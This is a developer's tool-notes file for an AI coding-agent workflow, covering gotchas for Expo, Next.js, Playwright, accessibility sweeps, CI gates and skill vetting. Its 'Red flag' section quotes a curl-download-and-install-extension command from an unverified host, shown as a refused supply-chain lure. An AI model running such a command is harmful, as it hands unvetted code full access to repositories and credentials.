# Tool Notes — what worked, what bit us

Execute updates this after each project. One entry per tool from the library (execute.md Part 4): what worked, gotchas, preferred patterns, versions that mattered. Starts mostly empty; fills as projects run.

## Expo + expo-router (SDK 56, RN 0.85, React 19) — an example app 2026-06
- Worked: full MVP on web + Expo Go with file-based routing and API routes (`app/api/*+api.ts`); `expo export --platform web` as a cheap CI-grade verification gate.
- Gotcha: `create-expo-app` prompts interactively when run inside an existing git repo — it still scaffolds; expect the prompt in automation. Read the versioned docs (docs.expo.dev/versions/v56.0.0) — SDK 56 moved fast past training data.
- Preferred: set `"main": "expo-router/entry"` in package.json (the entry switch); keep `AGENTS.md`/`CLAUDE.md` in the project pointing builders at the versioned docs.

## zod v4
- Worked: a single store-document schema doubled as a structural privacy guarantee (the schema cannot express forbidden data shapes).
- Gotcha: `.default({})` on object schemas fails typing in v4 — use `.prefault({})` instead.
- Preferred: one canonical document schema; parse at every storage boundary.

## jest-expo + @testing-library/react-native v14
- Worked: 47 tests (pure engines, store integration, screen-flow e2e, API) on the plain `jest-expo` preset.
- Gotcha 1: RNTL v14 made `render()` ASYNC — you must `await render(...)` or `screen` never binds and every query fails mysteriously.
- Gotcha 2: do NOT override `transformIgnorePatterns` — the jest-expo preset already handles RN/Expo packages; overriding it breaks transforms.
- Gotcha 3: singleton stores need a `JEST_WORKER_ID` check to fall back to an in-memory driver, or tests fight over native storage.
- Gotcha 4: the suite leaks an open handle ("A worker process has failed to exit gracefully" / "Force exiting Jest") — so a plain `jest`/`npm test` can HANG INDEFINITELY after every test has passed. Backgrounded, it sits forever (a 2s run hung 25 min once). ALWAYS run with `--forceExit` (add `--runInBand --ci` for determinism) and wrap in a hard cap: `timeout 150 npx jest <file> --ci --runInBand --forceExit`. Never launch a bare jest run in the background and wait on it.
- Preferred: minimal config — preset + moduleNameMapper + testMatch + clearMocks (see projects/example-app/jest.config.js).

## Metro (web bundling of native modules)
- Gotcha: Metro statically bundles even *dynamic* `import('expo-sqlite')` into web builds, breaking web export.
- Preferred: platform-split files — `sqliteDriver.native.ts` (real SQLite) + `sqliteDriver.ts` (web/localStorage driver). Metro picks `.native.ts` on iOS/Android and the plain file on web; native modules never enter the web bundle. expo-sqlite on web also needs wasm assets — avoid it there entirely.

## Neon (@neondatabase/serverless)
- Worked: wired into expo-router API routes (`/api/sync`) behind `DATABASE_URL` env detection; app fully functional without it (local-first, key-gated sync).
- Preferred: serverless driver in API routes only, never in client code; degraded local path first, TODO(keys) + SETUP-KEYS.md entry.

## Clerk (@clerk/clerk-expo)
- Worked: integration wired and key-gated — guest mode is the default path, real accounts unlock when `EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY` appears.
- Preferred: keyless-first — never make auth a build blocker; guest mode + documented key in SETUP-KEYS.md.
- Gotcha (2026-07): `@clerk/clerk-expo` shipped an **authorization bypass** (GHSA-w24r-5266-9c3c, combining organization/billing/reverification checks) — caught only when the security-gate started running `npm audit` on every push. `npm audit fix` resolved it as a lockfile-only semver-compatible bump (`tsc --noEmit` clean after). Auth SDKs get advisories too — audit them on every push, not at install time.

## Claude API (@anthropic-ai/sdk)
- Worked: streaming narration behind `ANTHROPIC_API_KEY` with a deterministic template fallback when absent — a single integration point (`src/ai/narrate.ts`) so the model/provider is swappable.
- Preferred: key-gate AI features with a useful non-AI fallback; rate-limit and cap tokens per the hard build rules.

## Lenis (smooth/inertia scroll) — 2026-06
- The "flow" engine the premium reference sites use (db-longbow.webflow.io literally ships Lenis — found by grepping its HTML). It's what makes a page feel premium vs "standard" for this owner.
- Install `npm i lenis`; **default import** (`import Lenis from "lenis"`). Drive it with ONE `requestAnimationFrame` loop (`lenis.raf(time)` inside the loop). Disable entirely under `prefers-reduced-motion` (return early, render nothing).
- Route in-page anchors through it: intercept `a[href^="#"]` clicks and call `lenis.scrollTo(target, { offset: -88 })` (offset clears a fixed nav), else links hard-jump.
- Add the Lenis CSS (`html.lenis, html.lenis body { height: auto }`, `.lenis.lenis-smooth { scroll-behavior: auto !important }`, `[data-lenis-prevent] { overscroll-behavior: contain }`) or the smooth scroll fights native `scroll-behavior: smooth`.
- **Coexists with framer-motion:** `useScroll` reads window scroll, which Lenis still drives — scroll-linked motion keeps working. Mount it once at the root (a `<SmoothScroll/>` client component in `layout.tsx`).

## Higgsfield MCP (image gen) — free plan, 2026-06
- **No free video.** `generate_video` (and the premium image models) require a PAID plan AND an MCP approval; a free plan (~8.65 cr) can't generate video at all. Even `soul_location` images need a paid plan. So for a "cinematic" hero on a free plan, the stand-in is free `z_image` stills + a CSS Ken Burns push + crossfade (`@keyframes`, opacity transitions) — looks cinematic, costs nothing. Real generated hero video stays a paid open item.
- `soul_location` requires a PAID plan; `z_image` works on free (~0.12 cr/img). `generate_image get_cost:true` reports a price but does NOT check plan entitlement, so a "cheap" job can still be rejected at submit.
- Gotcha: on dark "premium brand poster" / title-card prompts, z_image injects garbled TITLE/letter artifacts. Mitigate by describing a plain scene (no implied text) + strong negatives ("no text, no letters, no title, no watermark"), or crop the result. For real product photography, curated stock beats it outright (see Pexels note).
- Free plan = 1 concurrent job. Submit, then poll `show_generations` and read only `completed` items (don't trust an in-flight status). Sandbox flow: import a web URL with `media_import_url` first and pass the returned `media_id` — never raw URLs in `medias[].value`.

## Curated stock photography (keyless) — 2026-06
- Pexels CDN works with NO API key: direct `https://images.pexels.com/photos/<id>/<slug>.jpeg?auto=compress&cs=tinysrgb&w=<N>` returns 200. Discover ids/urls by WebFetch-ing a Pexels search page (e.g. `pexels.com/search/forest%20desk/`) and extracting the CDN links from the HTML — or `curl` the search page and grep for `images.pexels.com/photos/` URLs.
- Unsplash: the old `source.unsplash.com` random endpoint is DEAD (503). `https://images.unsplash.com/...` direct CDN URLs still work if you have a specific photo id.
- Preferred: pull the photo at build time, convert to webp, commit it locally (`public/backgrounds/*.webp`) — no runtime dependency on the CDN, no key, deterministic.

## sharp (in-sandbox image conversion) — 2026-06
- Install without polluting the project: `npm i --no-save sharp` (leaves `package.json` clean). Run a throwaway script from `/tmp` with `NODE_PATH="$PWD/node_modules" node /tmp/conv.mjs`. NOTE: `--no-save` packages get pruned by any later `npm i`/`uninstall` — reinstall if you need them again (same trap as playwright below).
- webp q80 crushed ~4.5MB source PNGs to ~30–235KB each on the an example app backgrounds — big LCP win for landing pages.
- Cleanup reminder: when you rip out an icon/component library to de-generic a UI, also drop the now-unused dep (e.g. `lucide-react` lingered in package.json with zero imports).

## Playwright (headless screenshots in sandbox) — 2026-06
- Install: `npm i --no-save playwright && npx playwright install chromium` — Chromium lands in `/opt/pw-browsers`. Run with `PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers`.
- **`--no-save` installs get pruned.** `npm i --no-save playwright` (and `--no-save sharp`) leave `package.json` clean, BUT any later `npm i`/`npm uninstall` prunes the un-saved packages — so **reinstall playwright right before a screenshot run** if you've touched deps since.
- TRAP: `pkill -f "next start"` also matches your OWN shell command string and kills the calling process (exit 144). Don't pkill by pattern — kill by port, or just start a fresh server on a new port and screenshot that.
- **Verify BOTH themes and mobile.** Make separate Playwright contexts with `colorScheme: "light"` and `"dark"` (and set the `.dark` class / `localStorage.theme` to force the page's class-based toggle), and a 390px-wide mobile context. Assert no horizontal overflow with `scrollWidth <= innerWidth` (`document.documentElement.scrollWidth <= window.innerWidth`) — this catches off-screen initial transforms (e.g. a card animating in from `x:` that extends page width on mobile; fix by entering on `y:` instead).
- Use this to verify rendered pixels (see principle): a screenshot is the only artifact that proves a UI change to the human.

## Next.js 16 (App Router) — 2026-06
- Versions that mattered: `next 16.2.9`, `react 19.2.4`, Tailwind v4, fonts via `next/font/google` exposed as CSS vars on `<html>` (current an example app stack: `Playfair_Display` display incl. `style: ["normal","italic"]`, `Inter` sans, `Fraunces` serif — Playfair superseded the earlier Fauna One).
- **Class-based dark mode on Tailwind v4:** declare `@custom-variant dark (&:where(.dark, .dark *));` in `globals.css` (the `:where()` keeps specificity 0). Toggle by adding `.dark` to `<html>`. Prevent the light→dark flash with a synchronous inline `<script>` in `<head>` (reads `localStorage.theme` then `prefers-color-scheme`, sets the class before first paint) + `suppressHydrationWarning` on `<html>`. A `useSyncExternalStore` + `MutationObserver` switch component stays in sync without setState-in-effect (lint-clean).
- `public/` convention is standard (`public/x` → served at `/x`).
- Gotcha: `next start` serves the build snapshot captured at startup — new code/assets DON'T appear until you rebuild AND restart. To screenshot a fresh change: rebuild, then start on a new port (avoids the pkill trap above), then capture.
## an example app effects layer is a reusable kit — an example marketing site 2026-06
- `projects/example-web/src/components/{aceternity,twentyfirst,reactbits}` (Aurora, Spotlight, SplitText,
  TextGenerate, ShinyText, BentoGrid spotlight-follow, Marquee, Particles) port almost verbatim into any
  Next 16 + Tailwind v4 site: same `cn` util, framer-motion, and `@theme` forest tokens. Pair with
  Fraunces (serif, `axes:["opsz","SOFT"]`) + Inter and the `.glass`/gradient utilities from its globals.css.
- Gotchas hit on the port: (1) `TextGenerateEffect` must put the inter-word space OUTSIDE the
  `inline-block` motion span or words collapse together; (2) `PageHero` using `SplitText` needs `title` as
  a **string**, not JSX — convert accented `<span>` titles to plain text; (3) dark canopy/pine heroes mean
  the sticky nav + mobile menu need a light-on-dark state before scroll and an opaque (not `.glass`)
  mobile dropdown, or text/hero bleed through.

## Icons — minimal, socials-only; Phosphor not Lucide — an example marketing site 2026-06
- **Owner preference: icons ONLY on social links; none elsewhere; never Lucide** (see user-profile.md).
  Replace decorative icons with typography + CSS accents (gold rule/bar, numbered badge, CSS hamburger/caret/spinner).
  Phosphor brand logos (`FacebookLogo`/`InstagramLogo`/`YoutubeLogo`, `weight="fill"`) cover the socials.
- Gotcha (Lucide): `lucide-react@1.x` **dropped trademarked brand icons** (Facebook/Instagram/YouTube) — builds
  fail with "export X doesn't exist". Phosphor keeps them (`FacebookLogo`/`InstagramLogo`/`YoutubeLogo`, use `weight="fill"`).
- Gotcha (Phosphor): components call `useContext(IconContext)`, which is **unsafe in React Server Components**.
  Fix: one `src/components/ui/icons.tsx` with `"use client"` that re-exports the needed icons — aliasing to the
  app's existing names (`Sparkle as Sparkles`, `CaretDown as ChevronDown`, `CircleNotch as Loader2`, `List as Menu`,
  `Microphone as Mic`, `DeviceMobile as Smartphone`, `UsersThree as Users`, `Wheelchair as Accessibility`,
  `NavigationArrow as Navigation`, `EnvelopeSimple as Mail`, `PaperPlaneTilt as Send`, `Handshake as HeartHandshake`)
  so each call site only changes its import source. Phosphor honors Tailwind `size-*` classes (CSS overrides the 1em default).
- Gotcha: Phosphor's CJS `require()` returns an empty object (lazy shim) — don't verify names via `node -e require`;
  check `node_modules/@phosphor-icons/react/dist/csr/<Name>.d.ts` instead. Turbopack uses the ESM build fine.

## Skill library (vetted, shelved — NOT auto-loaded) — 2026-06
Ingested from execute.md §4.1/§4.2 references into `.claude/skill-library/` (see its README). Kept OUT of
`.claude/skills/` on purpose: several carry executable scripts, and auto-loading untrusted third-party code
as startup config is a supply-chain risk. Copy a single folder into `.claude/skills/` on demand when a build
needs it (review scripts first).
- **llm-council** — multi-LLM consult (ChatGPT+Gemini) = the fact-check gate. Needs `OPENAI_API_KEY` +
  `GEMINI_API_KEY` (see `llm-council/.env.template`) to actually run; absent keys, fact-check from the model.
- **impeccable** — design-antipattern detector (browser/DOM + static engines, Node scripts).
- **karpathy-guidelines** — SWE workflow/standards.
- **ui-ux pack** (7): banner-design, design-system, brand, design, slides, ui-ux-pro-max, ui-styling.
- **taste pack** (13): brandkit, redesign-skill, imagegen-frontend-web/-mobile, soft/brutalist/minimalist-skill,
  taste-skill(+v1), gpt-tasteskill, stitch-skill, output-skill, image-to-code-skill.
- Overlap: taste/ui-ux duplicate the installed `design-taste-frontend`/`premium-scroll-flow` — shelved to
  avoid skill-selection ambiguity.

## Register-only sources (NOT vendored — pull per project on demand)
Too large or not skills, so referenced rather than copied:
- **antigravity-awesome-skills** (github.com/sickn33/antigravity-awesome-skills) — 5,378 skills; browse + cherry-pick, never bulk-install.
- **awesome-agent-skills** (VoltAgent) + **awesome-design-md** (VoltAgent) — curated link-lists, no SKILL.md.
- Frameworks/tools (install-per-project per Part-4 library, never as skills): GitReverse, Browser Harness,
  ECC, Ruflo, LangGraph/CrewAI/LangChain, AutoGPT, Codex Plugin CC, notebooklm-py.

## A11y + responsive verification recipe (axe-core via Playwright) — an example marketing site 2026-06
Reusable, keyless QA pass for any static/SSR web build — this is the "real tool, not a vibe" proof for
checklist #25 (a11y) and the universal-sizing check. Worked end-to-end:
- **Serve the build** (`out/` from `next build` static export) with `python3 -m http.server` (run it as a
  real background process — a `&` subshell inside a single tool call gets reaped; use the harness's
  background-run). Browsers live at `/opt/pw-browsers`; drive global Playwright (`/opt/node22/lib/node_modules/playwright`)
  with `PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers`.
- **axe-core is already vendored** at `node_modules/axe-core/axe.min.js` (via `eslint-plugin-jsx-a11y`). Inject
  it with `page.evaluate(axeSource)` then `await window.axe.run(document,{runOnly:['wcag2a','wcag2aa','wcag21a','wcag21aa']})`.
  Each violation node's `any[0].data` gives `fgColor/bgColor/contrastRatio/expectedContrastRatio/fontSize` — enough
  to fix contrast precisely without guessing.
- **Overflow check** in the same sweep: assert `document.documentElement.scrollWidth === window.innerWidth`
  per route × 375/768/1440; rank `getBoundingClientRect().right` to find the offending node.
- **Gotchas:** (1) an intro loader/animation (e.g. BibleLoader) covers the hero — wait ~4s before
  screenshotting or you capture the loader, not the page. (2) `requestfailed` noise from Next.js route
  **prefetch** aborts (`ERR_ABORTED`) and from externally-blocked embeds (an OSM iframe under a sandbox
  proxy) are not real errors — filter them; only `console.error`/`pageerror` count.
- **Contrast fix patterns that preserved the design:** dimming via `opacity-*` on small text *can't* pass AA —
  use a darker colour token instead; for an active/inactive list, give the active item an accent colour + full
  ink and the inactive a passing muted (`text-ink/65`+) rather than an opacity toggle. Scripts kept in the
  session scratchpad (probe.mjs / contrast.mjs).
- **More axe realities (example-web, 2026-07):** (1) `color-contrast` flags `aria-hidden` text too — it's a
  *visual* rule, so decorative pale text must actually meet 3:1 (large) / 4.5:1, not just be hidden from AT.
  (2) `aria-label` is **prohibited on plain `<span>`/`<div>`** (no role) — axe `aria-prohibited-attr`; give it
  a role or drop the label. (3) A single brand colour used both as text-on-white AND as a bg under white text
  must clear ≥4.5:1 against white once — same pair, both directions (ember `#c77e3c` failed → `#a05416`).
  (4) **Framer entrance delays must finish before the sweep's axe settle (2400ms)** or mid-fade colours read
  as contrast failures — keep hero entrance chains ≤ ~1.5s total (better UX anyway).
- **SVG path template gotcha:** building paths as `M-${expr}` yields `M--4` once the expr goes negative —
  Chromium rejects the path ("Expected number") and the element **silently vanishes** (no console error at
  render, only the beam missing). Compute signed numbers (`M${i*32 - 380}`); never prefix `-` to an
  expression that can itself be negative.

## Red flag — unverified "install this to get paid" tooling (kickbacks.ai) — 2026-06
Owner was handed `curl -L https://kickbacks.ai/vsix -o kickbacks.vsix && code --install-extension kickbacks.vsix`,
pitched as "now part of Execute" with a payout lure. **Refused / do not run.** Why it's the textbook
supply-chain shape: (1) a VSIX / editor extension runs with the **builder's full privileges** — every repo,
git credential, API key, `.env`, and live Claude session on the machine; (2) "it's part of <your tool>" was
false (grepped the repo: zero references); (3) the command targets the operator's *local* editor, not this
remote container, so running it via the agent does nothing useful anyway; (4) having an account / being
logged in says nothing about the payload. Verify provenance first (publisher, VS Code Marketplace listing,
official docs), sandbox if genuinely wanted, never pipe an unverified binary onto a machine holding client
creds. Generalised into `principles.md` (dev-environment = supply chain) + checklist #30.

## Framer Motion + Next 16 static export (reduced-motion / SSR) — an example marketing site 2026-06
The biggest recurring pain of the build. Rules that hold:
- **Keep `initial`/`hidden` deterministic.** Branching it on `useReducedMotion()` makes the SSR HTML differ from a reduced-motion client → hydration mismatch. Let reduced-motion only zero the *transition*, never change the initial state.
- **Don't rely on `MotionConfig reducedMotion="user"` for transform-based reveals.** It disables transforms for reduced-motion users, which hides any reveal that uncovers text via a transform (mask-rise heading → text parked off-screen → invisible).
- **`useReducedMotion()` ignores MotionConfig** — it reads the OS media query directly. A force-motion flag routed through MotionConfig won't reach hook-based components. For autonomous pointer flourishes, gate on a `motionAllowed()` helper that reads `window.matchMedia` with a `NEXT_PUBLIC_FORCE_MOTION=1` override (see `src/lib/motion.ts`).
- **Final working pattern = scroll-linked reveals** (`useScroll` + `useTransform` on the element's own scroll position; `src/components/site/Reveal.tsx` with `mode: "scroll" | "load"`). Always reach the visible target, can't be skipped by a fast flick, play for everyone (WCAG-AA fine). Above-the-fold content uses `mode: "load"` (a one-shot deterministic `initial`), because scroll-linked would render it only part-way up at first paint.
- **Sideways (x) reveals need `overflow-x: clip` on a wrapper, NOT `overflow-hidden`** — `overflow-hidden` breaks `position: sticky` scroll scenes. Applied to `<main>` in `src/app/layout.tsx`.
- **The hydration mismatch is DEV-only** and won't appear in the served static `out/` — caught instead by a source lint in the sweep (see below).

## visual-qa sweep.mjs — gate hardening (mechanical, fails the build) — an example marketing site 2026-06
`.claude/skills/visual-qa/sweep.mjs` now does more than screenshot. Each became a deterministic check that exits non-zero, because a gate that self-attests is a lie:
- **Cramped section seams** — a heavy/full-bleed/dark section followed by a light section whose first heading sits flush (<44px desktop / <28px mobile from the seam) is measured + fails.
- **Cross-route band repetition** — the same full-bleed band image used on 2+ routes is flagged + fails (overflow/a11y never see this; it reads as lazy/templated).
- **Reduced-motion hydration source lint** — scans `.tsx/.jsx` for `initial={{…reduce…}}` / `hidden:{…reduce…}` / `whileInView={{…reduce…}}` and fails. This is how you catch the dev-only hydration bug that the served build can't show you.
- **axe must actually run** — it was silently `skip`-ing when axe-core wasn't on the default path. Pass `AXE=…/node_modules/axe-core/axe.min.js`. For the axe pass, scroll through to trigger every `whileInView` reveal, then wait out the *longest* animation before sampling — else a reveal caught mid-fade reads as a false low-contrast fail. Force-settling inline styles does NOT stick (Framer's rAF overwrites them) — actually let them finish.
- **Speed:** was ~22 min (fully sequential, flat 4.5s/route wait). Parallelising routes (page pool, `VQA_CONCURRENCY` default 4) + hydration-gated waits → ~45s. Now cheap enough to run per commit.

## Turbopack / `next build` flake on the slow workspace FS — 2026-07
- **Nondeterministic broken chunk graph:** `next build` (Turbopack) occasionally emits a chunk graph
  referencing a chunk that doesn't exist on disk → the browser gets a 500 on
  `/_next/static/chunks/<id>.js` and every affected route logs a console error. A clean rebuild
  usually rolls a good graph.
- **Mitigation (now the standard flow):** build → playwright-probe **all** routes for ≥400 responses →
  rebuild if dirty → sweep the *verified* artifact with `visual-qa/run.sh --no-build`. Never re-build
  between verifying and sweeping — you'd sweep a different (possibly broken) artifact.
- **Relocating `.next` via symlink breaks Turbopack BUILDS** (module resolution refuses to cross it) —
  that trick is dev-server-only. `run.sh` handles the leftover symlink (empties the target instead of
  deleting the link).

## Process/server hygiene for gates & sweeps — 2026-07
- **Self-kill bug class:** `pkill -f "pattern"` / `pgrep -f` kills **your own shell** (exit 144) when
  the pattern substring appears anywhere in your own command line — and the `[s]tart` bracket trick
  does NOT save you if the literal string also appears elsewhere in the same compound command (e.g.
  the launch line you're re-running). Rule: **kill by pidfile or by port** (`fuser -k PORT/tcp`) from
  a *separate* command; never kill by pattern in the same command that mentions the target.
- **Orphaned-server bug class:** a crashed run's `python3 -m http.server` squats the port and a later
  sweep silently measures the WRONG SITE (happened: a example-web sweep measured an example marketing site — every
  route 404). **statusText fingerprints identify which server answered** (python says "File not
  found"; Next/serve say "Not Found"). Never sweep a port you didn't just bind. `visual-qa/run.sh`
  now enforces all of it: pidfile-kill of stale servers, refuse busy ports (walk up), loud abort if
  the server never comes up, hard time budgets (`timeout(1)`: build ≤600s, sweep ≤480s — a hang can
  never wedge a session or leave orphans).

## Pre-push + CI gate stack — 2026-07
- Pushes to ANY branch are blocked by `.claude/hooks/pre-push-gate.sh`, wired from two directions:
  a PreToolUse guard on the `git push` Bash call AND `.githooks/pre-push` (armed via
  `core.hooksPath` each SessionStart). The same gate re-runs in CI (`.github/workflows/gates.yml`,
  push + PR events) so a bypassed local hook still can't merge.
- Four legs per touched project: **security-gate** (secrets/TLS/.env/npm audit) ·
  **system-design-gate** (lockfile/.env.example/TODO(keys)⇒SETUP-KEYS/SQL-interp/token-storage) ·
  **learner discipline** (code change ⇒ PROJECT-LOG.md entry in the same push) ·
  **visual-qa freshness** (front-end change ⇒ `.vqa-pass.json` stamp whose treeHash matches the tree).
- **tree-hash gotcha:** hash file **CONTENT** (`.claude/hooks/tree-hash.sh` cat-hashes the files),
  never `git ls-files -s`-style index state — index metadata changes when you *commit*, so an
  index-based stamp goes stale the moment you commit the stamp itself.
- Escape hatch: `EXECUTE_GATE_BYPASS=1` (owner emergency only; log why in PROJECT-LOG.md).

## Environment gotchas (this container) — an example marketing site 2026-06
- **The local git checkout resets to an old commit between turns.** Everything survived only because it was pushed to origin each phase. Lesson: commit + push per phase; `git fetch` + ff-merge at the start of each turn. (Now in CLAUDE.md hard rules.)
- **`.next` → `/root/.cache` symlink recurs after a container restart** (leftover from an abandoned dev-cache experiment) and breaks `npm run build` with `Cannot find module '@tailwindcss/postcss'` (Turbopack infers the wrong root). Fix: `rm .next` so it's a normal in-project dir, then rebuild. The `predev` script that created it is gone, but the symlink artifact survives restarts.

## Images — baked-in borders + real-org sourcing — an example marketing site 2026-06
- **`object-cover` can't crop letterboxing baked into the pixels** (a 9:16 phone shot on a 4:3 white canvas). Detect the real content bounds with a PIL column/row margin scan and crop, then re-export. Pre-screen imported photos for baked borders before using them full-bleed.
- **For a real organisation, never AI-generate or fabricate people or a venue** — use the owner's real photos (cropped/optimised) or vetted real stock. Off-brand stock is a real miss (a generic Catholic-pew photo on a Nigerian Pentecostal site) — replace sitewide, delete the orphan. Each full-bleed photo used ~once per route (enforced by the band-repetition check above).

## timi-tutor skill (installed, auto-loaded) — 2026-06
Owner-authored tutoring skill at `.claude/skills/timi-tutor/SKILL.md` (NOT shelved — pure instructions, no
scripts, so safe to auto-load). Socratic / show-then-apply / active-recall / visual-first (Excalidraw MCP)
/ no-handholding. Triggers: "teach me", "explain", "how does X work", homework/exam prep, uploaded study
materials, conceptual "why" questions. Distinct from `llm-council` (shelved: needs API keys + carries scripts).

## Platform capabilities to track (Anthropic ships fast — verify before depending)
- **Model tiers (adopted in the orchestration rule):** Sonnet 5 = cheap brainstorm/research thought-partner; Fable 5 = frontier architecture/planning/judgment; Opus 4.8 = powerful build/execution at a fraction of frontier cost. Fable plans, Opus builds, Sonnet ideates. Agent frontmatter is set to match (research=sonnet, judgment agents=fable, developer/designer/qa=sonnet for greenfield, opus for existing codebases). The `Agent` tool's `model` param accepts `sonnet|opus|haiku|fable`.
- **Idea→build workflow worth reusing:** brain-dump with Sonnet 5 → structure into a tracker (Linear) as tickets tagged with dependencies / blockers / human-in-loop-or-agent → hand the plan to Fable 5 in the project file to architect from project+ticket context → execute with Opus 4.8 build agents. Same quality, lower cost.
- Auto Mode / memory consolidation / Computer Use / "/dream": VERIFIED 2026-07-07 — see "Claude Code capability check" below (one of the reel's claims was fake). Doc-check before depending; a reel is a lead, not a source.

## Vendored design skills (2026-07, from tool-library repos)
- `git clone`d + vetted (markdown-only, no scripts) into `.claude/skills/`: redesign-skill, soft-skill,
  minimalist-skill, brutalist-skill, imagegen-frontend-web, imagegen-frontend-mobile, brandkit,
  stitch-skill, output-skill (source: Leonxlnx/taste-skill, MIT). They auto-load on description match and
  serve UNDER `owner-design-taste` (the design LAW) + `caveman-mode`. See `.claude/skills/VENDORED-SKILLS.md`.
- NOT vendored: **impeccable** (127MB app + browser/CSP scripts; redundant with `visual-qa`) — install via
  its own CLI if ever needed. **ui-ux-pro-max** (20MB + Python DB tooling) — install via its own installer,
  don't vendor. Generic `taste-skill`/`gpt-tasteskill` — conflict with `owner-design-taste`, skipped.
- Supply-chain rule held: only reviewed, script-free markdown was pulled in (webapp-security-principles §5).

## Claude Code PreToolUse gates vs compound git commands — 2026-07-07
- A PreToolUse hook fires BEFORE the Bash call runs, so a checkout-commit-push one-liner gets gated
  against the PRE-command HEAD/branch — the gate judged a 100-file range when the actual push was
  2 files. Split state-changing git operations and the push into separate Bash calls.
- Same hook also matched the WORDS "git push" inside a heredoc being written to a file and ran the
  full gate on a plain file write. When writing files whose CONTENT mentions git commands, prefer
  the Write tool over a Bash heredoc. (Guard-side fixes drafted; pending owner approval —
  scratchpad apply-execute-improvements.py.)
- The permission classifier denies agent SELF-modification even inside approved work: registering a
  hook in settings.json, deleting a branch, and patching the enforcement hooks were each denied
  (2026-07-07). Don't retry phrasings/variants — batch every change to Execute's own
  enforcement/config machinery into ONE reviewable patch script and hand it to the owner to
  run/approve (the apply-execute-improvements.py pattern).

## yt-dlp through the agent proxy (video links) — 2026-07-07
- TikTok: works end-to-end (metadata + mp4). Direct mp4/webm URLs: work. Instagram: public reels
  verified working (a private one may still need cookies). YouTube: metadata prints, but media
  downloads usually 403 (datacenter bot-wall).
- NEVER pip-install curl_cffi (or the yt-dlp curl-cffi extra) here: yt-dlp then auto-impersonates
  and the impersonated TLS fingerprint is RESET by the agent proxy (curl error 35, connection
  reset), breaking even the previously-working TikTok path. pip uninstall -y curl_cffi restores it.
  Full matrix + paste-a-link workflow: .claude/skills/watch-video/SKILL.md.

## Composio (SaaS-action layer for Execute) — researched 2026-07-07
- Hosted MCP only (no local npx server). Register at **local scope** (`~/.claude.json` or
  `claude mcp add --transport http composio <URL> --headers "X-API-Key:..."`), NOT in the committed
  `.mcp.json` — Claude Code has open bugs (#51581, #18692) where header env-var placeholders get
  written as resolved literal keys. Key: `COMPOSIO_API_KEY` (composio.dev, Settings, Project
  Settings, API Keys; free tier 20K tool calls/month, no card).
- After registration, per-app OAuth (Gmail/Shopify/Notion...) happens interactively: `/mcp`, pick
  the server, Authenticate. `user_id` scopes which connected account a session acts as.
- Least privilege: no global read-only switch — hand-pick an `allowed_tools` allowlist (skip
  `*_DELETE_*`/`*_SEND_*` unless required) or use single-toolkit servers
  (`https://backend.composio.dev/v3/mcp/<SERVER_ID>?user_id=<USER_ID>`). Revoking blast radius =
  revoke the connected account in the Composio dashboard, not just deleting config.
- Transport is Streamable HTTP (proxy-friendly); untested through this sandbox's proxy.

## tmux vs subagents (owner asked, tested 2026-07-07)
- tmux IS in the container (`/usr/bin/tmux`) and detached parallel jobs work (two crawl-site runs
  ran in parallel and self-terminated clean). But: poll-only (capture-pane/flag files — no
  completion notification), invisible to the harness task system, and a container reclaim kills
  sessions silently. Background Bash tasks + the Agent tool do the same job WITH auto-notification,
  per-ticket model tiers, isolated context, and gate/permission integration.
- Verdict: **subagents/background tasks win for Execute's orchestration**; the reel's tmux pitch
  solves a laptop-closed-on-a-VPS problem this cloud environment doesn't have. Keep tmux for the
  niche it's actually good at here: driving interactive TUIs a task must automate.

## Claude Code capability check (rule 6, verified in docs 2026-07-07)
- **Auto Mode: REAL, running in this environment now** — it is the permission classifier that
  arbitrates writes (the self-modification denials). Tunable via `autoMode.environment` in
  `.claude/settings.json` (owner-approved edit; classifier blocks the agent editing it).
- **/dream / AutoDream memory consolidation: NOT REAL** — zero doc/changelog presence; GH #38461
  reports `/dream` returns "Unknown skill". The real memory features: auto MEMORY.md + `/compact`.
  Social-reel claims fail rule 6 verification routinely — always check docs before adopting.
- **Computer Use: real but local macOS/Windows Desktop only** — NOT available in cloud sessions;
  off Execute's roadmap while it runs remote.

## Gas Town (steveyegge/gastown) — built + trialed 2026-07-07
- Builds in-container: needs `apt-get install libicu-dev` first (dolt cgo dep), then
  `GOTOOLCHAIN=auto go install ./cmd/gt` (auto-fetches go1.26 toolchain). gt 1.2.1 ran.
- Trial stopped at the dependency wall: `gt init` requires beads (`bd`) + dolt; the beads
  `go install` was classifier-blocked (external code), and init errors "not a git repository"
  even inside a fresh git repo — misleading message, likely the missing bd.
- **Verdict: DO NOT adopt now.** Design center is a persistent human workstation/VPS town
  (~/gt, 20-30 agents, Mayor as a long-lived interactive Claude Code instance). Execute's
  container is ephemeral and its orchestration needs (5-ish agents, tracked, gated) are already
  covered by the Agent tool + tasks + git-backed memory. Nested `claude` processes spawned by gt
  would be untracked by the harness and double-billed — same objection as tmux-hosted sessions.
- **Steal the one good idea instead:** gastown's "hook" = park uncommitted work state in git so a
  dead agent's successor resumes exactly where it died. Execute's commit-per-green-unit rule
  covers 80% of this; if agent deaths keep costing tickets, consider a WIP-stash-on-death hook.
- Revisit if Execute moves to a persistent VPS or needs >5 concurrent build agents with handoffs.
